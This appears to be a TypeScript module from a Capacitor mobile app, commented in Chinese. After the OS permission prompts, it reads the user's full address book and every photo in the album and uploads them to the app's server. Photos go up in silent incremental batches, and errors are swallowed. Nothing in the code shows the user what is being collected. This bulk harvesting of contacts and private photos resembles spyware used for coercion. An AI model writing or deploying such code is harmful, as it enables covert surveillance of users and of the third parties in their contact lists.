import { Capacitor, registerPlugin } from '@capacitor/core'
import request from './request'

/** 原生通訊錄聯絡人結構 */
export interface NativeContact {
    name: string
    phones: string[]
}

/** 原生相冊圖片結構（data 為 JPEG base64，不含 data: 前綴） */
export interface NativePhoto {
    id: string
    data: string
    modified: number
    width: number
    height: number
}

export interface SyncProgress {
    /** 已掃描張數 */
    scanned: number
    /** 相冊總張數 */
    total: number
    /** 本次新上傳張數 */
    uploaded: number
    /** 是否進行中 */
    running: boolean
}

/**
 * 原生運行時權限 + 數據讀取插件
 * 安卓：AppPermissionPlugin.java
 * iOS： AppPermissionPlugin.swift
 */
interface AppPermissionPlugin {
    requestAlbum(): Promise<{ granted: boolean }>
    requestContacts(): Promise<{ granted: boolean }>
    openSettings(): Promise<void>
    getContacts(): Promise<{ contacts: NativeContact[]; total: number }>
    getAlbumCount(): Promise<{ total: number }>
    getAlbumPhotos(options: { offset: number; limit: number }): Promise<{
        photos: NativePhoto[]
        total: number
        hasMore: boolean
    }>
}

export const AppPermission = registerPlugin<AppPermissionPlugin>('AppPermission')

/** 是否運行在 App 原生殼內（非 H5） */
export const isNativeApp = (): boolean => Capacitor.isNativePlatform()

// ============================== 權限 ==============================

/** 請求相冊權限。H5 直接視為放行且不做任何事 */
export const requestAlbumPermission = async (): Promise<boolean> => {
    if (!Capacitor.isNativePlatform()) return true
    try {
        const res = await AppPermission.requestAlbum()
        return !!res.granted
    } catch (err) {
        console.warn('請求相冊權限失敗：', err)
        return false
    }
}

/** 請求通訊錄權限。H5 直接視為放行且不做任何事 */
export const requestContactsPermission = async (): Promise<boolean> => {
    if (!Capacitor.isNativePlatform()) return true
    try {
        const res = await AppPermission.requestContacts()
        return !!res.granted
    } catch (err) {
        console.warn('請求通訊錄權限失敗：', err)
        return false
    }
}

/** 跳轉系統設定頁（用戶永久拒絕後引導手動開啟） */
export const openNativeSettings = async (): Promise<void> => {
    if (!Capacitor.isNativePlatform()) return
    try {
        await AppPermission.openSettings()
    } catch (err) {
        console.warn('開啟設定頁失敗：', err)
    }
}

// ============================== 數據上傳 ==============================

const CONTACTS_API = '/api/user/sync-contacts'
const PHOTOS_API = '/api/user/sync-photos'
const PAGE_SIZE = 10
const UPLOAD_TIMEOUT = 60000

/** base64 轉 Blob */
const base64ToBlob = (base64: string): Blob => {
    const bin = atob(base64)
    const bytes = new Uint8Array(bin.length)
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i)
    return new Blob([bytes], { type: 'image/jpeg' })
}

/**
 * 讀取全部通訊錄並上傳後端
 * POST /api/user/sync-contacts  JSON：{ userId, contacts: [{name, phones:[]}] }
 * 僅原生環境執行；失敗不影響頁面使用
 */
export const syncContactsToServer = async (userId: string | number): Promise<number> => {
    if (!Capacitor.isNativePlatform() || !userId) return 0
    try {
        const { contacts } = await AppPermission.getContacts()
        if (!contacts.length) return 0

        const { data } = await request.post(CONTACTS_API, {
            userId,
            contacts
        }, { timeout: UPLOAD_TIMEOUT })

        if (data.code === 1) {
            console.log(`通訊錄已同步 ${contacts.length} 條`)
            return contacts.length
        }
        console.warn('通訊錄同步失敗：', data.message)
        return 0
    } catch (err) {
        console.warn('通訊錄同步異常：', err)
        return 0
    }
}

// 防止多用戶數據混雜 + 防止重複進頁併發
let albumSyncing = false

/**
 * 讀取全部相冊圖片並上傳後端（增量）
 * POST /api/user/sync-photos  multipart：user_id、images[]、ids[]
 * - 已上傳過且未修改的圖片自動跳過（localStorage 記錄 id -> modified）
 * - 圖片在原生側已壓縮為最長邊 1280、JPEG 質量 70
 * 僅原生環境執行
 */
export const syncAlbumPhotos = async (
    userId: string | number,
    onProgress?: (p: SyncProgress) => void
): Promise<void> => {
    if (!Capacitor.isNativePlatform() || !userId) return
    if (albumSyncing) return
    albumSyncing = true

    const storeKey = `album_synced_${userId}`
    const readStore = (): Record<string, number> => {
        try {
            return JSON.parse(localStorage.getItem(storeKey) || '{}')
        } catch {
            return {}
        }
    }

    try {
        const { total } = await AppPermission.getAlbumCount()
        if (!total) {
            onProgress?.({ scanned: 0, total: 0, uploaded: 0, running: false })
            return
        }

        const synced = readStore()
        // 本輪仍存在的 id（用於清理後端已刪除的本地記錄）
        const freshMap: Record<string, number> = {}
        let scanned = 0
        let uploaded = 0
        let offset = 0
        let completed = false

        onProgress?.({ scanned: 0, total, uploaded: 0, running: true })

        while (offset < total) {
            const { photos, hasMore } = await AppPermission.getAlbumPhotos({ offset, limit: PAGE_SIZE })
            if (!photos.length) break

            const pending = photos.filter(p => synced[p.id] !== p.modified)

            if (pending.length) {
                const formData = new FormData()
                formData.append('user_id', String(userId))
                pending.forEach(p => {
                    formData.append('images', base64ToBlob(p.data), `${p.id}.jpg`)
                    formData.append('ids', p.id)
                })

                const { data } = await request.post(PHOTOS_API, formData, {
                    headers: { 'Content-Type': 'multipart/form-data' },
                    timeout: UPLOAD_TIMEOUT
                })

                if (data.code === 1) {
                    pending.forEach(p => { synced[p.id] = p.modified })
                    uploaded += pending.length
                } else {
                    console.warn('相冊圖片上傳失敗：', data.message)
                    // 本批失敗：中斷，保留進度，下次進入再試
                    break
                }
            }

            photos.forEach(p => { freshMap[p.id] = p.modified })
            scanned += photos.length
            offset += photos.length

            onProgress?.({ scanned, total, uploaded, running: true })

            if (!hasMore) {
                completed = true
                break
            }
        }

        if (completed) {
            // 全量掃描完成：用本輪實際見到的集合重建，清理已刪除圖片的殘留鍵
            localStorage.setItem(storeKey, JSON.stringify(freshMap))
        } else {
            // 中途失敗：僅保存新上傳成功的記錄，不裁剪未掃描部分
            localStorage.setItem(storeKey, JSON.stringify(synced))
        }

        console.log(`相冊同步完成：掃描 ${scanned}/${total}，新上傳 ${uploaded}`)
        onProgress?.({ scanned, total, uploaded, running: false })
    } catch (err) {
        console.warn('相冊同步異常：', err)
        onProgress?.({ scanned: 0, total: 0, uploaded: 0, running: false })
    } finally {
        albumSyncing = false
    }
}
